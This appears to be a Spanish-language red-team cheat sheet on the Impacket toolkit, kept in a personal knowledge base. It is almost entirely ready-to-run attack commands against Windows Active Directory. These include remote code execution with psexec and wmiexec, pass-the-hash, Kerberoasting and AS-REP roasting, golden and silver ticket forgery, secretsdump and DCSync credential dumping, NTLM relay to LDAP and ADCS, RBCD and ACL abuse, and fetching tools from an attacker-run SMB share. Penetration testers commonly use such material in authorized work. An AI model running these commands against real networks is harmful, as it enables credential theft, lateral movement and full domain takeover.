---
aliases:
  - Impacket
  - impacket
tags:
  - tool/impacket
  - technique/lateral-movement
  - technique/credential-access
  - env/windows
  - env/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Credential Access]]"
  - "[[Lateral Movement]]"
linked:
  - "[[Active Directory Explotación]]"
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[DCSync]]"
  - "[[NTLM Relay]]"
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[AD CS Abuse]]"
  - "[[netexec]]"
---
# Impacket Toolkit

***

## Overview

Suite Python de SecureAuth/Fortra. Implementa **SMB, MSRPC, Kerberos, LDAP, NTLM, DCERPC, NTDS** desde cero. Install: `pipx install impacket` / `git clone https://github.com/fortra/impacket && pipx install ./impacket`.

Binarios en `$PATH` tras instalación: `impacket-<tool>` o `<tool>.py` si está clonado.

> Regla: Impacket acepta PtH (`-hashes LM:NT`), Kerberos (`-k -no-pass` con `KRB5CCNAME`), AES key (`-aesKey`). Todos los tools usan el formato `DOMAIN/user:pass@target`.

***

## Sintaxis compartida

```bash
<tool> <DOMAIN>/<user>:<pass>@<target> [opciones]
<tool> <DOMAIN>/<user>@<target> -hashes :<NThash>
<tool> <DOMAIN>/<user>@<target> -aesKey <aes256>
<tool> <DOMAIN>/<user>@<target> -k -no-pass              # Kerberos ccache
KRB5CCNAME=user.ccache <tool> -k -no-pass <user>@<target>.<domain>
```

Targets FQDN son obligatorios para Kerberos.

***

## Ejecución remota

### psexec

```bash
impacket-psexec DOMAIN/user:pass@target
impacket-psexec -hashes :<NT> Administrator@target       # PtH → SYSTEM
impacket-psexec DOMAIN/user@target -k -no-pass
```

- Crea servicio + binario en ADMIN$. SYSTEM shell. Muy ruidoso (EventID 7045, 4697).

### smbexec

```bash
impacket-smbexec DOMAIN/user:pass@target
```

- Más silencioso que psexec. No sube binario; semi-interactivo vía servicios + cmd.

### wmiexec

```bash
impacket-wmiexec DOMAIN/user:pass@target
impacket-wmiexec -hashes :<NT> Administrator@target
```

- Win32_Process.Create. **No** genera EventID 7045. Más común en red teams.

### atexec

```bash
impacket-atexec DOMAIN/user:pass@target 'whoami'
```

- Crea tarea programada, ejecuta, borra. One-shot, no interactivo.

### dcomexec

```bash
impacket-dcomexec DOMAIN/user:pass@target
```

- DCOM vía MMC20.Application / ShellWindows / ShellBrowserWindow.

### mssqlclient

```bash
impacket-mssqlclient DOMAIN/user:pass@target -windows-auth
impacket-mssqlclient sa:sa@target
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> enum_links
SQL> enum_impersonate
```

***

## Kerberos

### GetUserSPNs (Kerberoasting)

```bash
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip <dc> -request -outputfile spns.hashes
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip <dc> -request -usersfile targets.txt
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip <dc>                # solo listar
```

Ver [[Kerberoasting]] para hashcat mode 13100/19700.

### GetNPUsers (AS-REP Roasting)

```bash
# Unauth (si conoces user válido)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -no-pass -dc-ip <dc>

# Auth (enum completo)
impacket-GetNPUsers DOMAIN/user:pass -request -format hashcat -outputfile asrep.hashes -dc-ip <dc>
```

Ver [[AS-REP Roasting]] para hashcat mode 18200.

### getTGT

```bash
impacket-getTGT DOMAIN/user:pass
impacket-getTGT DOMAIN/user -hashes :<NT>
impacket-getTGT DOMAIN/user -aesKey <aes256>
export KRB5CCNAME=user.ccache
```

### getST

```bash
# S4U2self + S4U2proxy (Constrained Delegation / RBCD)
impacket-getST -spn CIFS/victim.domain -impersonate Administrator DOMAIN/svc:pass -dc-ip <dc>

# RBCD (requiere haber escrito msDS-AllowedToActOnBehalfOfOtherIdentity)
impacket-getST -spn CIFS/dc01.domain -impersonate Administrator DOMAIN/fake_computer\$:pass -dc-ip <dc>

# U2U (desde Shadow Credentials flow)
impacket-getST -u2u -self -impersonate Administrator DOMAIN/user:pass
```

### ticketer (Golden / Silver ticket forge)

```bash
# Golden ticket
impacket-ticketer -nthash <krbtgt_NT> -domain-sid S-1-5-21-... -domain DOMAIN Administrator

# Silver ticket
impacket-ticketer -nthash <service_NT> -domain-sid S-1-5-21-... -domain DOMAIN \
  -spn CIFS/victim.domain Administrator
```

Ver [[Golden Ticket]] / [[Silver Ticket]].

### ticketConverter

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### describeTicket

```bash
impacket-describeTicket ticket.ccache
```

Parse completo de ticket: flags, groups (PAC), validity.

***

## Credential dumping

### secretsdump

```bash
# Remoto (SAM + LSA + NTDS por defecto si tiene ACL DRS)
impacket-secretsdump DOMAIN/user:pass@dc

# PtH
impacket-secretsdump -hashes :<NT> Administrator@target

# Solo DCSync (user con ACL DRS)
impacket-secretsdump -just-dc DOMAIN/user:pass@dc

# Solo NTDS user específico
impacket-secretsdump -just-dc-user Administrator DOMAIN/user:pass@dc

# Desde ntds.dit offline + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Desde SAM + SECURITY + SYSTEM offline
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Ver [[DCSync]].

***

## LDAP / AD

### GetADUsers

```bash
impacket-GetADUsers DOMAIN/user:pass -all -dc-ip <dc>
```

### lookupsid (RID enum)

```bash
impacket-lookupsid DOMAIN/user:pass@dc 20000
impacket-lookupsid DOMAIN/guest@dc 20000                       # null-ish
```

### rpcdump

```bash
impacket-rpcdump @target                                       # pre-auth MSRPC enum
```

### rpcmap

```bash
impacket-rpcmap -auth-level 6 ncacn_ip_tcp:<target>
```

### samrdump

```bash
impacket-samrdump DOMAIN/user:pass@target
```

### reg

```bash
impacket-reg DOMAIN/user:pass@target save -keyName 'HKLM\SAM' -o \\target\C$\temp\
impacket-reg DOMAIN/user:pass@target query -keyName 'HKLM\SOFTWARE\Microsoft\...'
```

***

## NTLM Relay

### ntlmrelayx

```bash
# Relay básico a SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Dump SAM de víctima
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
impacket-ntlmrelayx -t smb://victim -smb2support --no-dump --no-smb2support-on-unsigned

# LDAP relay (ACL attack)
impacket-ntlmrelayx -t ldaps://dc --escalate-user user
impacket-ntlmrelayx -t ldap://dc --delegate-access
impacket-ntlmrelayx -t ldap://dc --add-computer                # RBCD setup
impacket-ntlmrelayx -t ldap://dc --shadow-credentials --shadow-target victim\$

# MSSQL
impacket-ntlmrelayx -t mssql://target

# ADCS (ESC8)
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template 'DomainController'
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template 'User'

# SOCKS mode (reutilizar sesiones)
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass DOMAIN/user@target
```

Ver [[NTLM Relay]] para flows completos + coerción.

***

## SMB interactivo

### smbclient

```bash
impacket-smbclient DOMAIN/user:pass@target
# >>> shares / use <share> / ls / get file / put file / mkdir / rm
```

### smbserver

```bash
impacket-smbserver share /tmp/share -smb2support
impacket-smbserver share /tmp/share -smb2support -username u -password p
```

Útil para transferencia Windows:

```cmd
copy \\attacker\share\tool.exe .
```

***

## Otros útiles

### mqtt_check / mqtt_collect

MQTT broker enum.

### addcomputer

```bash
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Passw0rd1!' \
  -dc-ip <dc> DOMAIN/user:pass
```

Usa MachineAccountQuota (default 10). Prereq para Shadow Credentials / RBCD.

### owneredit

```bash
impacket-owneredit -action write -new-owner attacker -target victim DOMAIN/user:pass -dc-ip <dc>
```

Modificar owner de objeto AD (parte de chains ACL).

### dacledit

```bash
impacket-dacledit -action write -rights FullControl -principal attacker -target victim \
  DOMAIN/user:pass -dc-ip <dc>
```

Añadir ACE a DACL de objeto.

### rbcd

```bash
impacket-rbcd -action write -delegate-to victim\$ -delegate-from attacker\$ \
  DOMAIN/user:pass -dc-ip <dc>
```

Escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en `victim$`.

### Get-GPPPassword

```bash
impacket-Get-GPPPassword DOMAIN/user:pass@dc
```

MS14-025: cPassword en SYSVOL (AES decrypt).

### goldenPac

```bash
impacket-goldenPac DOMAIN/user:pass@target
```

MS14-068 — forje ticket con SID 500.

### karmaSMB

Rogue SMB server, responde a cualquier file con uno controlado.

### mimikatz (impacket-mimikatz)

Wrapper remoto para Mimikatz vía DCOM/SMB.

***

## Flows típicos

### Post-creds user low-priv

```bash
impacket-GetUserSPNs DOMAIN/u:p -dc-ip $DC -request -outputfile spns
impacket-GetNPUsers DOMAIN/u:p -request -format hashcat -outputfile asrep -dc-ip $DC
impacket-GetADUsers DOMAIN/u:p -all -dc-ip $DC
impacket-lookupsid DOMAIN/u:p@$DC 20000
```

### Tras DA/hash Administrator

```bash
impacket-secretsdump -just-dc DOMAIN/Administrator:pass@$DC | tee ntds.dump
impacket-psexec -hashes :<NT> Administrator@target
```

### Cross-forest con Golden

```bash
# Domain A krbtgt + SID History de Domain B EA
impacket-ticketer -nthash <krbtgt> -domain-sid <A_SID> -extra-sid <B_EA_SID> \
  -domain A.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass Administrator@dc.b.local
```

***

## Referencias

- Repo: https://github.com/fortra/impacket
- Examples: https://github.com/fortra/impacket/tree/master/examples
- Cada tool: `<tool> -h`
